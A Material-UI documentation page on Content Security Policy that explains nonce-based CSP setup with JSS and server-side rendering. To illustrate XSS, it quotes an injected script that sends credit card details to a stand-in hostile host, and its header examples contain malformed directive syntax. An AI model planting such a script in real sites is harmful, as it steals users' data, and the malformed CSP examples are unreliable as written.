# Content Security Policy (CSP)

<p class="description">Material-UI supports Content Security Policy headers.</p>

## What is CSP and why is it useful?

Basically, CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` will allow all assets that are located at `https://example.com/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:

    <script>
      sendCreditCardDetails('https://hostile.example');
    </script>
    

This vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.

## How does one implement CSP?

In order to use CSP with Material-UI (and JSS), you need to use a nonce. A nonce is a randomly generated string that is only used once, therefore you need to add a server middleware to generate one on each request. JSS has a [great tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) on how to achieve this with Express and React Helmet. For a basic rundown, continue reading.

A CSP nonce is a Base 64 encoded string. You can generate one like this:

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

It is very important you use UUID version 4, as it generates an **unpredictable** string. You then apply this nonce to the CSP header. A CSP header might look like this with the nonce applied:

```js
header('Content-Security-Policy')
  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
```

If you are using Server Side Rendering (SSR), you should pass the nonce in the `<style>` tag on the server.

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: sheetsRegistry.toString() } }
/>
```

Then, you must pass this nonce to JSS so it can add it to subsequent `<style>` tags. The client side gets the nonce from a header. You must include this header regardless of whether or not SSR is used.

```jsx
<meta property="csp-nonce" content={nonce} />
```
